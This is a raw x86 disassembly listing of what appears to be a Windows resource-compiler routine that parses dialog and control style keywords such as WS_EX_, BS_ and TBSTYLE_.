  40562b:	eb 6b                	jmp    0x405698
  40562d:	b8 98 c1 40 00       	mov    $0x40c198,%eax
  405632:	81 3e 57 53 5f 45    	cmpl   $0x455f5357,(%esi)
  405638:	75 10                	jne    0x40564a
  40563a:	66 81 7e 04 58 5f    	cmpw   $0x5f58,0x4(%esi)
  405640:	75 08                	jne    0x40564a
  405642:	83 c6 06             	add    $0x6,%esi
  405645:	83 eb 06             	sub    $0x6,%ebx
  405648:	77 4e                	ja     0x405698
  40564a:	5e                   	pop    %esi
  40564b:	5b                   	pop    %ebx
  40564c:	f9                   	stc
  40564d:	c3                   	ret
  40564e:	80 7e 02 5f          	cmpb   $0x5f,0x2(%esi)
  405652:	75 53                	jne    0x4056a7
  405654:	b8 4c ae 40 00       	mov    $0x40ae4c,%eax
  405659:	66 81 3e 57 53       	cmpw   $0x5357,(%esi)
  40565e:	74 30                	je     0x405690
  405660:	b8 80 af 40 00       	mov    $0x40af80,%eax
  405665:	66 81 3e 42 53       	cmpw   $0x5342,(%esi)
  40566a:	74 24                	je     0x405690
  40566c:	b8 e8 b1 40 00       	mov    $0x40b1e8,%eax
  405671:	66 81 3e 53 53       	cmpw   $0x5353,(%esi)
  405676:	74 18                	je     0x405690
  405678:	b8 b4 b2 40 00       	mov    $0x40b2b4,%eax
  40567d:	66 81 3e 45 53       	cmpw   $0x5345,(%esi)
  405682:	74 0c                	je     0x405690
  405684:	b8 6c b5 40 00       	mov    $0x40b56c,%eax
  405689:	66 81 3e 44 53       	cmpw   $0x5344,(%esi)
  40568e:	75 ba                	jne    0x40564a
  405690:	83 c6 03             	add    $0x3,%esi
  405693:	83 eb 03             	sub    $0x3,%ebx
  405696:	76 30                	jbe    0x4056c8
  405698:	e8 e1 2a 00 00       	call   0x40817e
  40569d:	72 29                	jb     0x4056c8
  40569f:	e8 11 ff ff ff       	call   0x4055b5
  4056a4:	5a                   	pop    %edx
  4056a5:	5a                   	pop    %edx
  4056a6:	c3                   	ret
  4056a7:	80 7e 03 5f          	cmpb   $0x5f,0x3(%esi)
  4056ab:	74 3f                	je     0x4056ec
  4056ad:	b8 3c b9 40 00       	mov    $0x40b93c,%eax
  4056b2:	81 3e 42 54 4e 53    	cmpl   $0x534e5442,(%esi)
  4056b8:	75 12                	jne    0x4056cc
  4056ba:	80 7e 04 5f          	cmpb   $0x5f,0x4(%esi)
  4056be:	75 08                	jne    0x4056c8
  4056c0:	83 c6 04             	add    $0x4,%esi
  4056c3:	83 eb 04             	sub    $0x4,%ebx
  4056c6:	77 d0                	ja     0x405698
  4056c8:	5e                   	pop    %esi
  4056c9:	5b                   	pop    %ebx
  4056ca:	f9                   	stc
  4056cb:	c3                   	ret
  4056cc:	b8 50 b8 40 00       	mov    $0x40b850,%eax
  4056d1:	81 3e 54 42 53 54    	cmpl   $0x54534254,(%esi)
  4056d7:	75 ef                	jne    0x4056c8
  4056d9:	81 7e 04 59 4c 45 5f 	cmpl   $0x5f454c59,0x4(%esi)
  4056e0:	75 e6                	jne    0x4056c8
  4056e2:	83 c6 08             	add    $0x8,%esi
  4056e5:	83 eb 08             	sub    $0x8,%ebx
  4056e8:	77 ae                	ja     0x405698
  4056ea:	eb dc                	jmp    0x4056c8
  4056ec:	51                   	push   %ecx
  4056ed:	57                   	push   %edi
  4056ee:	8b 06                	mov    (%esi),%eax
  4056f0:	0f c8                	bswap  %eax
  4056f2:	bf d0 bf 40 00       	mov    $0x40bfd0,%edi
  4056f7:	8b 0f                	mov    (%edi),%ecx
  4056f9:	83 c7 04             	add    $0x4,%edi
  4056fc:	89 fa                	mov    %edi,%edx
  4056fe:	f2 af                	repnz scas %es:(%edi),%eax
  405700:	75 0d                	jne    0x40570f
  405702:	29 d7                	sub    %edx,%edi
  405704:	81 c7 18 c0 40 00    	add    $0x40c018,%edi
  40570a:	8b 47 fc             	mov    -0x4(%edi),%eax
  40570d:	31 ff                	xor    %edi,%edi
  40570f:	5f                   	pop    %edi
  405710:	59                   	pop    %ecx
  405711:	75 17                	jne    0x40572a
  405713:	83 c6 04             	add    $0x4,%esi
  405716:	83 eb 04             	sub    $0x4,%ebx
  405719:	76 0f                	jbe    0x40572a
  40571b:	e8 5e 2a 00 00       	call   0x40817e
  405720:	72 08                	jb     0x40572a
  405722:	e8 8e fe ff ff       	call   0x4055b5
  405727:	5a                   	pop    %edx
  405728:	5a                   	pop    %edx
  405729:	c3                   	ret
  40572a:	5e                   	pop    %esi
  40572b:	5b                   	pop    %ebx
  40572c:	f9                   	stc
  40572d:	c3                   	ret
  40572e:	89 3d 10 ab 40 00    	mov    %edi,0x40ab10
  405734:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  40573a:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  405741:	e8 c3 ec ff ff       	call   0x404409
  405746:	72 76                	jb     0x4057be
  405748:	74 74                	je     0x4057be
  40574a:	c6 05 c0 ab 40 00 00 	movb   $0x0,0x40abc0
  405751:	8a 15 c5 ab 40 00    	mov    0x40abc5,%dl
  405757:	e8 22 ea ff ff       	call   0x40417e
  40575c:	0f 82 89 00 00 00    	jb     0x4057eb
  405762:	a2 c0 ab 40 00       	mov    %al,0x40abc0
  405767:	e8 9d ec ff ff       	call   0x404409
  40576c:	72 50                	jb     0x4057be
  40576e:	74 4e                	je     0x4057be
  405770:	e8 8e eb ff ff       	call   0x404303
  405775:	72 6d                	jb     0x4057e4
  405777:	74 0e                	je     0x405787
  405779:	e8 4e e4 ff ff       	call   0x403bcc
  40577e:	72 64                	jb     0x4057e4
  405780:	e8 f9 e4 ff ff       	call   0x403c7e
  405785:	eb 41                	jmp    0x4057c8
  405787:	e8 81 e5 ff ff       	call   0x403d0d
  40578c:	74 d4                	je     0x405762
  40578e:	e8 46 fe ff ff       	call   0x4055d9
  405793:	73 33                	jae    0x4057c8
  405795:	c6 05 bf ab 40 00 01 	movb   $0x1,0x40abbf
  40579c:	e8 67 e3 ff ff       	call   0x403b08
  4057a1:	c6 05 bf ab 40 00 00 	movb   $0x0,0x40abbf
  4057a8:	73 06                	jae    0x4057b0
  4057aa:	09 d2                	or     %edx,%edx
  4057ac:	75 72                	jne    0x405820
  4057ae:	eb 34                	jmp    0x4057e4
  4057b0:	e8 d9 e3 ff ff       	call   0x403b8e
  4057b5:	72 09                	jb     0x4057c0
  4057b7:	74 c7                	je     0x405780
  4057b9:	ba 4b 08 00 00       	mov    $0x84b,%edx
  4057be:	eb 3a                	jmp    0x4057fa
  4057c0:	89 3d 10 ab 40 00    	mov    %edi,0x40ab10
  4057c6:	eb 9f                	jmp    0x405767
  4057c8:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  4057ce:	8b 12                	mov    (%edx),%edx
  4057d0:	e8 03 e9 ff ff       	call   0x4040d8
  4057d5:	72 49                	jb     0x405820
  4057d7:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  4057dd:	89 02                	mov    %eax,(%edx)
  4057df:	e9 5d ff ff ff       	jmp    0x405741
  4057e4:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4057eb:	ba 48 28 00 00       	mov    $0x2848,%edx
  4057f0:	f6 05 c5 ab 40 00 10 	testb  $0x10,0x40abc5
  4057f7:	74 01                	je     0x4057fa
  4057f9:	42                   	inc    %edx
  4057fa:	80 25 c5 ab 40 00 ef 	andb   $0xef,0x40abc5
  405801:	a0 c5 ab 40 00       	mov    0x40abc5,%al
  405806:	80 25 c5 ab 40 00 f6 	andb   $0xf6,0x40abc5
  40580d:	80 3d c0 ab 40 00 00 	cmpb   $0x0,0x40abc0
  405814:	75 0a                	jne    0x405820
  405816:	a8 08                	test   $0x8,%al
  405818:	75 04                	jne    0x40581e
  40581a:	a8 01                	test   $0x1,%al
  40581c:	74 02                	je     0x405820
  40581e:	f8                   	clc
  40581f:	c3                   	ret
  405820:	f9                   	stc
  405821:	c3                   	ret
  405822:	c7 05 c0 aa 40 00 00 	movl   $0x0,0x40aac0
  405829:	00 00 00 
  40582c:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  405832:	e8 d2 eb ff ff       	call   0x404409
  405837:	72 52                	jb     0x40588b
  405839:	74 50                	je     0x40588b
  40583b:	e8 c3 ea ff ff       	call   0x404303
  405840:	72 20                	jb     0x405862
  405842:	75 22                	jne    0x405866
  405844:	e8 46 ed ff ff       	call   0x40458f
  405849:	72 10                	jb     0x40585b
  40584b:	e8 b8 e2 ff ff       	call   0x403b08
  405850:	72 09                	jb     0x40585b
  405852:	e8 37 e3 ff ff       	call   0x403b8e
  405857:	72 d9                	jb     0x405832
  405859:	74 12                	je     0x40586d
  40585b:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  405862:	31 c0                	xor    %eax,%eax
  405864:	eb 0c                	jmp    0x405872
  405866:	e8 61 e3 ff ff       	call   0x403bcc
  40586b:	72 19                	jb     0x405886
  40586d:	e8 0c e4 ff ff       	call   0x403c7e
  405872:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  405878:	89 02                	mov    %eax,(%edx)
  40587a:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  405881:	00 00 00 
  405884:	f8                   	clc
  405885:	c3                   	ret
  405886:	ba 5d 08 00 00       	mov    $0x85d,%edx
  40588b:	f9                   	stc
  40588c:	c3                   	ret
  40588d:	f6 05 c8 ab 40 00 04 	testb  $0x4,0x40abc8
  405894:	75 2c                	jne    0x4058c2
  405896:	3b 3d 94 ab 40 00    	cmp    0x40ab94,%edi
  40589c:	77 08                	ja     0x4058a6
  40589e:	3b 3d 88 ab 40 00    	cmp    0x40ab88,%edi
  4058a4:	73 1c                	jae    0x4058c2
  4058a6:	ff 35 0c ab 40 00    	push   0x40ab0c
  4058ac:	e8 58 eb ff ff       	call   0x404409
  4058b1:	58                   	pop    %eax
  4058b2:	73 04                	jae    0x4058b8
  4058b4:	e3 0c                	jecxz  0x4058c2
  4058b6:	eb 1d                	jmp    0x4058d5
  4058b8:	3b 05 0c ab 40 00    	cmp    0x40ab0c,%eax
  4058be:	74 04                	je     0x4058c4
  4058c0:	4f                   	dec    %edi
  4058c1:	41                   	inc    %ecx
  4058c2:	f8                   	clc
  4058c3:	c3                   	ret
  4058c4:	e8 3a ea ff ff       	call   0x404303
  4058c9:	ba 62 08 00 00       	mov    $0x862,%edx
  4058ce:	74 05                	je     0x4058d5
  4058d0:	ba 25 08 00 00       	mov    $0x825,%edx
  4058d5:	f9                   	stc
  4058d6:	c3                   	ret
  4058d7:	51                   	push   %ecx
  4058d8:	57                   	push   %edi
  4058d9:	ba cc cc 40 00       	mov    $0x40cccc,%edx
  4058de:	8b 0d 1c cd 40 00    	mov    0x40cd1c,%ecx
  4058e4:	53                   	push   %ebx
  4058e5:	56                   	push   %esi
  4058e6:	8b 3a                	mov    (%edx),%edi
  4058e8:	8a 07                	mov    (%edi),%al
  4058ea:	3c 00                	cmp    $0x0,%al
  4058ec:	74 09                	je     0x4058f7
  4058ee:	3a 06                	cmp    (%esi),%al
  4058f0:	75 05                	jne    0x4058f7
  4058f2:	46                   	inc    %esi
  4058f3:	47                   	inc    %edi
  4058f4:	4b                   	dec    %ebx
  4058f5:	79 f1                	jns    0x4058e8
  4058f7:	5e                   	pop    %esi
  4058f8:	5b                   	pop    %ebx
  4058f9:	74 05                	je     0x405900
  4058fb:	83 c2 04             	add    $0x4,%edx
  4058fe:	e2 e4                	loop   0x4058e4
  405900:	5f                   	pop    %edi
  405901:	59                   	pop    %ecx
  405902:	c3                   	ret
  405903:	56                   	push   %esi
  405904:	e8 b6 d3 ff ff       	call   0x402cbf
  405909:	75 25                	jne    0x405930
  40590b:	be ec ab 40 00       	mov    $0x40abec,%esi
  405910:	b8 80 ce 40 00       	mov    $0x40ce80,%eax
  405915:	e8 64 28 00 00       	call   0x40817e
  40591a:	72 14                	jb     0x405930
  40591c:	83 f8 7f             	cmp    $0x7f,%eax
  40591f:	77 0c                	ja     0x40592d
  405921:	c1 e0 02             	shl    $0x2,%eax
  405924:	05 cc cc 40 00       	add    $0x40cccc,%eax
  405929:	8b 30                	mov    (%eax),%esi
  40592b:	31 c0                	xor    %eax,%eax
  40592d:	5a                   	pop    %edx
  40592e:	f8                   	clc
  40592f:	c3                   	ret
  405930:	5e                   	pop    %esi
  405931:	f9                   	stc
  405932:	c3                   	ret
  405933:	89 15 d4 aa 40 00    	mov    %edx,0x40aad4
  405939:	e8 cb ea ff ff       	call   0x404409
  40593e:	72 69                	jb     0x4059a9
  405940:	74 3f                	je     0x405981
  405942:	e8 bc e9 ff ff       	call   0x404303
  405947:	ba 4d 08 00 04       	mov    $0x400084d,%edx
  40594c:	72 5b                	jb     0x4059a9
  40594e:	74 62                	je     0x4059b2
  405950:	e8 77 e2 ff ff       	call   0x403bcc
  405955:	ba 4d 08 00 00       	mov    $0x84d,%edx
  40595a:	72 4d                	jb     0x4059a9
  40595c:	e8 3e e3 ff ff       	call   0x403c9f
  405961:	72 46                	jb     0x4059a9
  405963:	e9 98 00 00 00       	jmp    0x405a00
  405968:	e8 9b e1 ff ff       	call   0x403b08
  40596d:	72 31                	jb     0x4059a0
  40596f:	e8 1a e2 ff ff       	call   0x403b8e
  405974:	72 c3                	jb     0x405939
  405976:	74 e4                	je     0x40595c
  405978:	e8 c3 e3 ff ff       	call   0x403d40
  40597d:	72 25                	jb     0x4059a4
  40597f:	eb 10                	jmp    0x405991
  405981:	80 0d c5 ab 40 00 02 	orb    $0x2,0x40abc5
  405988:	e8 fa f8 ff ff       	call   0x405287
  40598d:	72 1a                	jb     0x4059a9
  40598f:	75 18                	jne    0x4059a9
  405991:	09 db                	or     %ebx,%ebx
  405993:	74 0f                	je     0x4059a4
  405995:	e8 69 ff ff ff       	call   0x405903
  40599a:	72 3e                	jb     0x4059da
  40599c:	75 54                	jne    0x4059f2
  40599e:	eb 1b                	jmp    0x4059bb
  4059a0:	09 d2                	or     %edx,%edx
  4059a2:	75 05                	jne    0x4059a9
  4059a4:	ba 4d 08 00 00       	mov    $0x84d,%edx
  4059a9:	80 25 c5 ab 40 00 7f 	andb   $0x7f,0x40abc5
  4059b0:	f9                   	stc
  4059b1:	c3                   	ret
  4059b2:	e8 4c ff ff ff       	call   0x405903
  4059b7:	72 af                	jb     0x405968
  4059b9:	75 37                	jne    0x4059f2
  4059bb:	ba 6f 08 00 00       	mov    $0x86f,%edx
  4059c0:	f6 05 c5 ab 40 00 80 	testb  $0x80,0x40abc5
  4059c7:	75 e0                	jne    0x4059a9
  4059c9:	51                   	push   %ecx
  4059ca:	56                   	push   %esi
  4059cb:	e8 de c6 00 00       	call   0x4120ae
  4059d0:	59                   	pop    %ecx
  4059d1:	89 c3                	mov    %eax,%ebx
  4059d3:	e8 55 f8 ff ff       	call   0x40522d
  4059d8:	eb 3a                	jmp    0x405a14
  4059da:	e8 f8 fe ff ff       	call   0x4058d7
  4059df:	74 0a                	je     0x4059eb
  4059e1:	ba 73 04 00 00       	mov    $0x473,%edx
  4059e6:	e8 09 e5 ff ff       	call   0x403ef4
  4059eb:	e8 3d f8 ff ff       	call   0x40522d
  4059f0:	eb 22                	jmp    0x405a14
  4059f2:	ba 6f 08 00 00       	mov    $0x86f,%edx
  4059f7:	f6 05 c5 ab 40 00 80 	testb  $0x80,0x40abc5
  4059fe:	75 a9                	jne    0x4059a9
  405a00:	8b 15 d4 aa 40 00    	mov    0x40aad4,%edx
  405a06:	66 c7 02 ff ff       	movw   $0xffff,(%edx)
  405a0b:	66 89 42 02          	mov    %ax,0x2(%edx)
  405a0f:	89 d0                	mov    %edx,%eax
  405a11:	83 c0 04             	add    $0x4,%eax
  405a14:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  405a1b:	00 00 00 
  405a1e:	80 25 c5 ab 40 00 7f 	andb   $0x7f,0x40abc5
  405a25:	f8                   	clc
  405a26:	c3                   	ret
  405a27:	f9                   	stc
  405a28:	c3                   	ret
  405a29:	e8 35 f4 ff ff       	call   0x404e63
  405a2e:	72 f7                	jb     0x405a27
  405a30:	e8 0f fb ff ff       	call   0x405544
  405a35:	72 f0                	jb     0x405a27
  405a37:	e8 25 eb ff ff       	call   0x404561
  405a3c:	c7 05 cc aa 40 00 4f 	movl   $0x84f,0x40aacc
  405a43:	08 00 00 
  405a46:	e8 07 ec ff ff       	call   0x404652
  405a4b:	72 da                	jb     0x405a27
  405a4d:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405a53:	83 c2 10             	add    $0x10,%edx
  405a56:	66 89 02             	mov    %ax,(%edx)
  405a59:	e8 03 eb ff ff       	call   0x404561
  405a5e:	72 c7                	jb     0x405a27
  405a60:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405a66:	83 c2 12             	add    $0x12,%edx
  405a69:	e8 c5 fe ff ff       	call   0x405933
  405a6e:	72 b7                	jb     0x405a27
  405a70:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  405a75:	8b 15 78 aa 40 00    	mov    0x40aa78,%edx
  405a7b:	bb c0 f2 40 00       	mov    $0x40f2c0,%ebx
  405a80:	e8 e3 f7 ff ff       	call   0x405268
  405a85:	83 c2 02             	add    $0x2,%edx
  405a88:	89 15 78 aa 40 00    	mov    %edx,0x40aa78
  405a8e:	e8 ce ea ff ff       	call   0x404561
  405a93:	72 7c                	jb     0x405b11
  405a95:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405a9b:	c7 02 00 00 00 50    	movl   $0x50000000,(%edx)
  405aa1:	80 0d c5 ab 40 00 01 	orb    $0x1,0x40abc5
  405aa8:	e8 81 fc ff ff       	call   0x40572e
  405aad:	72 62                	jb     0x405b11
  405aaf:	f6 05 c8 ab 40 00 02 	testb  $0x2,0x40abc8
  405ab6:	74 22                	je     0x405ada
  405ab8:	80 25 c8 ab 40 00 fd 	andb   $0xfd,0x40abc8
  405abf:	ba 91 08 00 04       	mov    $0x4000891,%edx
  405ac4:	a1 dc aa 40 00       	mov    0x40aadc,%eax
  405ac9:	81 78 12 ff ff 82 00 	cmpl   $0x82ffff,0x12(%eax)
  405ad0:	75 3f                	jne    0x405b11
  405ad2:	f7 00 0e 00 00 00    	testl  $0xe,(%eax)
  405ad8:	74 37                	je     0x405b11
  405ada:	e8 82 ea ff ff       	call   0x404561
  405adf:	72 30                	jb     0x405b11
  405ae1:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405ae7:	83 c2 08             	add    $0x8,%edx
  405aea:	e8 67 f2 ff ff       	call   0x404d56
  405aef:	72 20                	jb     0x405b11
  405af1:	e8 6b ea ff ff       	call   0x404561
  405af6:	72 17                	jb     0x405b0f
  405af8:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405afe:	83 c2 04             	add    $0x4,%edx
  405b01:	80 0d c5 ab 40 00 11 	orb    $0x11,0x40abc5
  405b08:	e8 21 fc ff ff       	call   0x40572e
  405b0d:	72 02                	jb     0x405b11
  405b0f:	f8                   	clc
  405b10:	c3                   	ret
  405b11:	f9                   	stc
  405b12:	c3                   	ret
  405b13:	f9                   	stc
  405b14:	c3                   	ret
  405b15:	e8 49 f3 ff ff       	call   0x404e63
  405b1a:	72 f7                	jb     0x405b13
  405b1c:	e8 23 fa ff ff       	call   0x405544
  405b21:	72 f0                	jb     0x405b13
  405b23:	e8 39 ea ff ff       	call   0x404561
  405b28:	c7 05 cc aa 40 00 4f 	movl   $0x84f,0x40aacc
  405b2f:	08 00 00 
  405b32:	80 0d c6 ab 40 00 02 	orb    $0x2,0x40abc6
  405b39:	e8 14 eb ff ff       	call   0x404652
  405b3e:	72 d3                	jb     0x405b13
  405b40:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405b46:	83 c2 14             	add    $0x14,%edx
  405b49:	89 02                	mov    %eax,(%edx)
  405b4b:	e8 11 ea ff ff       	call   0x404561
  405b50:	72 c1                	jb     0x405b13
  405b52:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405b58:	83 c2 18             	add    $0x18,%edx
  405b5b:	e8 d3 fd ff ff       	call   0x405933
  405b60:	72 b1                	jb     0x405b13
  405b62:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  405b67:	8b 15 78 aa 40 00    	mov    0x40aa78,%edx
  405b6d:	bb c0 f2 40 00       	mov    $0x40f2c0,%ebx
  405b72:	e8 f1 f6 ff ff       	call   0x405268
  405b77:	83 c2 02             	add    $0x2,%edx
  405b7a:	89 15 78 aa 40 00    	mov    %edx,0x40aa78
  405b80:	e8 dc e9 ff ff       	call   0x404561
  405b85:	72 8c                	jb     0x405b13
  405b87:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405b8d:	83 c2 08             	add    $0x8,%edx
  405b90:	c7 02 00 00 00 50    	movl   $0x50000000,(%edx)
  405b96:	80 0d c5 ab 40 00 01 	orb    $0x1,0x40abc5
  405b9d:	e8 8c fb ff ff       	call   0x40572e
  405ba2:	72 7d                	jb     0x405c21
  405ba4:	f6 05 c8 ab 40 00 02 	testb  $0x2,0x40abc8
  405bab:	74 23                	je     0x405bd0
  405bad:	80 25 c8 ab 40 00 fd 	andb   $0xfd,0x40abc8
  405bb4:	ba 91 08 00 04       	mov    $0x4000891,%edx
  405bb9:	a1 dc aa 40 00       	mov    0x40aadc,%eax
  405bbe:	81 78 18 ff ff 82 00 	cmpl   $0x82ffff,0x18(%eax)
  405bc5:	75 5a                	jne    0x405c21
  405bc7:	f7 40 08 0e 00 00 00 	testl  $0xe,0x8(%eax)
  405bce:	74 51                	je     0x405c21
  405bd0:	e8 8c e9 ff ff       	call   0x404561
  405bd5:	72 4a                	jb     0x405c21
  405bd7:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405bdd:	83 c2 0c             	add    $0xc,%edx
  405be0:	e8 71 f1 ff ff       	call   0x404d56
  405be5:	72 3a                	jb     0x405c21
  405be7:	e8 75 e9 ff ff       	call   0x404561
  405bec:	72 31                	jb     0x405c1f
  405bee:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405bf4:	83 c2 04             	add    $0x4,%edx
  405bf7:	80 0d c5 ab 40 00 11 	orb    $0x11,0x40abc5
  405bfe:	e8 2b fb ff ff       	call   0x40572e
  405c03:	72 1c                	jb     0x405c21
  405c05:	e8 57 e9 ff ff       	call   0x404561
  405c0a:	72 13                	jb     0x405c1f
  405c0c:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405c12:	e8 0b fc ff ff       	call   0x405822
  405c17:	72 08                	jb     0x405c21
  405c19:	e8 6f fc ff ff       	call   0x40588d
  405c1e:	c3                   	ret
  405c1f:	f8                   	clc
  405c20:	c3                   	ret
  405c21:	f9                   	stc
  405c22:	c3                   	ret
  405c23:	e8 3b f2 ff ff       	call   0x404e63
  405c28:	72 38                	jb     0x405c62
  405c2a:	0d 00 00 00 50       	or     $0x50000000,%eax
  405c2f:	89 06                	mov    %eax,(%esi)
  405c31:	66 c7 46 12 ff ff    	movw   $0xffff,0x12(%esi)
  405c37:	66 89 5e 14          	mov    %bx,0x14(%esi)
  405c3b:	89 f2                	mov    %esi,%edx
  405c3d:	83 c2 16             	add    $0x16,%edx
  405c40:	f6 05 c6 ab 40 00 20 	testb  $0x20,0x40abc6
  405c47:	74 08                	je     0x405c51
  405c49:	e8 91 f8 ff ff       	call   0x4054df
  405c4e:	73 13                	jae    0x405c63
  405c50:	c3                   	ret
  405c51:	c7 05 cc aa 40 00 7e 	movl   $0x87e,0x40aacc
  405c58:	08 00 00 
  405c5b:	e8 53 f8 ff ff       	call   0x4054b3
  405c60:	73 01                	jae    0x405c63
  405c62:	c3                   	ret
  405c63:	83 c0 02             	add    $0x2,%eax
  405c66:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  405c6b:	80 fa 00             	cmp    $0x0,%dl
  405c6e:	75 05                	jne    0x405c75
  405c70:	e8 ec e8 ff ff       	call   0x404561
  405c75:	c7 05 cc aa 40 00 4f 	movl   $0x84f,0x40aacc
  405c7c:	08 00 00 
  405c7f:	e8 ce e9 ff ff       	call   0x404652
  405c84:	72 5e                	jb     0x405ce4
  405c86:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405c8c:	83 c2 10             	add    $0x10,%edx
  405c8f:	66 89 02             	mov    %ax,(%edx)
  405c92:	e8 ca e8 ff ff       	call   0x404561
  405c97:	72 4b                	jb     0x405ce4
  405c99:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405c9f:	83 c2 08             	add    $0x8,%edx
  405ca2:	e8 af f0 ff ff       	call   0x404d56
  405ca7:	72 3b                	jb     0x405ce4
  405ca9:	e8 b3 e8 ff ff       	call   0x404561
  405cae:	72 32                	jb     0x405ce2
  405cb0:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405cb6:	80 0d c5 ab 40 00 01 	orb    $0x1,0x40abc5
  405cbd:	e8 6c fa ff ff       	call   0x40572e
  405cc2:	72 20                	jb     0x405ce4
  405cc4:	e8 98 e8 ff ff       	call   0x404561
  405cc9:	72 17                	jb     0x405ce2
  405ccb:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405cd1:	83 c2 04             	add    $0x4,%edx
  405cd4:	80 0d c5 ab 40 00 11 	orb    $0x11,0x40abc5
  405cdb:	e8 4e fa ff ff       	call   0x40572e
  405ce0:	72 02                	jb     0x405ce4
  405ce2:	f8                   	clc
  405ce3:	c3                   	ret
  405ce4:	f9                   	stc
  405ce5:	c3                   	ret
  405ce6:	e8 78 f1 ff ff       	call   0x404e63
  405ceb:	72 4a                	jb     0x405d37
  405ced:	0d 00 00 00 50       	or     $0x50000000,%eax
  405cf2:	89 46 08             	mov    %eax,0x8(%esi)
  405cf5:	80 fb fe             	cmp    $0xfe,%bl
  405cf8:	75 0c                	jne    0x405d06
  405cfa:	66 89 5e 18          	mov    %bx,0x18(%esi)
  405cfe:	66 c7 46 1a 00 00    	movw   $0x0,0x1a(%esi)
  405d04:	eb 0a                	jmp    0x405d10
  405d06:	66 c7 46 18 ff ff    	movw   $0xffff,0x18(%esi)
  405d0c:	66 89 5e 1a          	mov    %bx,0x1a(%esi)
  405d10:	89 f2                	mov    %esi,%edx
  405d12:	83 c2 1c             	add    $0x1c,%edx
  405d15:	f6 05 c6 ab 40 00 20 	testb  $0x20,0x40abc6
  405d1c:	74 08                	je     0x405d26
  405d1e:	e8 bc f7 ff ff       	call   0x4054df
  405d23:	73 13                	jae    0x405d38
  405d25:	c3                   	ret
  405d26:	c7 05 cc aa 40 00 7e 	movl   $0x87e,0x40aacc
  405d2d:	08 00 00 
  405d30:	e8 7e f7 ff ff       	call   0x4054b3
  405d35:	73 01                	jae    0x405d38
  405d37:	c3                   	ret
  405d38:	83 c0 02             	add    $0x2,%eax
  405d3b:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  405d40:	80 fa 00             	cmp    $0x0,%dl
  405d43:	75 05                	jne    0x405d4a
  405d45:	e8 17 e8 ff ff       	call   0x404561
  405d4a:	c7 05 cc aa 40 00 4f 	movl   $0x84f,0x40aacc
  405d51:	08 00 00 
  405d54:	80 0d c6 ab 40 00 02 	orb    $0x2,0x40abc6
  405d5b:	e8 f2 e8 ff ff       	call   0x404652
  405d60:	72 d5                	jb     0x405d37
  405d62:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405d68:	83 c2 14             	add    $0x14,%edx
  405d6b:	89 02                	mov    %eax,(%edx)
  405d6d:	e8 ef e7 ff ff       	call   0x404561
  405d72:	72 68                	jb     0x405ddc
  405d74:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405d7a:	83 c2 0c             	add    $0xc,%edx
  405d7d:	e8 d4 ef ff ff       	call   0x404d56
  405d82:	72 58                	jb     0x405ddc
  405d84:	e8 d8 e7 ff ff       	call   0x404561
  405d89:	72 4f                	jb     0x405dda
  405d8b:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405d91:	83 c2 08             	add    $0x8,%edx
  405d94:	80 0d c5 ab 40 00 01 	orb    $0x1,0x40abc5
  405d9b:	e8 8e f9 ff ff       	call   0x40572e
  405da0:	72 3a                	jb     0x405ddc
  405da2:	e8 ba e7 ff ff       	call   0x404561
  405da7:	72 31                	jb     0x405dda
  405da9:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405daf:	83 c2 04             	add    $0x4,%edx
  405db2:	80 0d c5 ab 40 00 11 	orb    $0x11,0x40abc5
  405db9:	e8 70 f9 ff ff       	call   0x40572e
  405dbe:	72 1c                	jb     0x405ddc
  405dc0:	e8 9c e7 ff ff       	call   0x404561
  405dc5:	72 13                	jb     0x405dda
  405dc7:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  405dcd:	e8 50 fa ff ff       	call   0x405822
  405dd2:	72 08                	jb     0x405ddc
  405dd4:	e8 b4 fa ff ff       	call   0x40588d
  405dd9:	c3                   	ret
  405dda:	f8                   	clc
  405ddb:	c3                   	ret
  405ddc:	f9                   	stc
  405ddd:	c3                   	ret
  405dde:	e8 dc ce ff ff       	call   0x402cbf
  405de3:	75 7f                	jne    0x405e64
  405de5:	be ec ab 40 00       	mov    $0x40abec,%esi
  405dea:	80 fb 04             	cmp    $0x4,%bl
  405ded:	75 1b                	jne    0x405e0a
  405def:	81 3e 49 43 4f 4e    	cmpl   $0x4e4f4349,(%esi)
  405df5:	75 6d                	jne    0x405e64
  405df7:	80 0d c6 ab 40 00 20 	orb    $0x20,0x40abc6
  405dfe:	31 c0                	xor    %eax,%eax
  405e00:	b8 03 00 00 00       	mov    $0x3,%eax
  405e05:	66 bb 82 00          	mov    $0x82,%bx
  405e09:	c3                   	ret
  405e0a:	80 fb 05             	cmp    $0x5,%bl
  405e0d:	75 57                	jne    0x405e66
